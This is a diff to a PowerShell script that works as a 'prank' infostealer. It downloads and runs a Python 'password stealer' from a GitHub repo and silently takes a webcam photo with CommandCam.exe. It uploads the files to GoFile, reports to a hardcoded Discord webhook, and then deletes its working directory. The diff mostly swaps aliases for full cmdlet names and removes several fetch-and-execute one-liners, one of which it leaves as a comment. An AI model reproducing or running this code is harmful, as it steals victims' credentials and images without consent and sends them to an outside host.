@@ -2,7 +2,7 @@ if (-not (Test-Path -Path "C:\Temp")) {
     New-Item -Path "C:\Temp" -ItemType Directory
 }
 
-cd C:\Temp
+Set-Location C:\Temp
 function Send-DiscordMessage {
     param (
         [string]$message
@@ -22,18 +22,7 @@ function Upload-FileAndGetLink {
     param (
         [string]$filePath
     )
-
-    # Get URL from GoFile
-    # $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/servers'
-    # if ($serverResponse.status -ne "ok") {
-    #     Write-Host "Failed to get server URL: $($serverResponse.status)"
-    #     return $null
-    # }
-
-    # Define the upload URI
-    # $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"
     $uploadUri = "https://store1.gofile.io/uploadFile"
-    # Prepare the file for uploading
     $fileBytes = Get-Content $filePath -Raw -Encoding Byte
     $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
     $boundary = [System.Guid]::NewGuid().ToString()
@@ -68,7 +57,7 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/availableusername0/dem
 Start-Process python.exe -ArgumentList 'script.py'
 
 # 5. Take photo from web cam
-iwr https://signalswim.com/downloads/CommandCam.exe -OutFile CommandCam.exe
+Invoke-WebRequest https://signalswim.com/downloads/CommandCam.exe -OutFile CommandCam.exe
 .\CommandCam.exe /filename C:\Temp\prank.bmp /delay 500 /quiet
 
 # Main script
@@ -80,7 +69,7 @@ $webhook = "https://discord.com/api/webhooks/1291112619054338182/RlsoBpv3pfU_to4
 
 
 # 1. Download password stealer
-iwr https://raw.githubusercontent.com/availableusername0/demo/refs/heads/main/stealer.py -OutFile C:\Temp\stealer.py
+Invoke-WebRequest https://raw.githubusercontent.com/availableusername0/demo/refs/heads/main/stealer.py -OutFile C:\Temp\stealer.py
 # 2. run password stealer
 python C:\Temp\stealer.py
 
@@ -107,11 +96,4 @@ Start-Sleep -s 1.5
 
 # 5. Delete the temp directory
 Remove-Item -Path "C:\Temp" -Recurse -Force
-
-powershell (Invoke-WebRequest -Uri 'https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1' -OutFile 'demo.ps1')
-powershell -NoExit -c "Invoke-WebRequest -Uri 'https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1' -OutFile 'C:\\Temp\demo.ps1'" 
-
-Invoke-WebRequest -Uri "https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content | powershell -command -
-
-
-powershell -NoExit -command "cd C:\Invoke-WebRequest -Uri 'https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1' -UseBasicParsing | Select-Object -ExpandProperty Content | powershell -command -"
+# powershell -NoExit -command "Invoke-WebRequest -Uri 'https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1' -UseBasicParsing | Select-Object -ExpandProperty Content | powershell -command -"
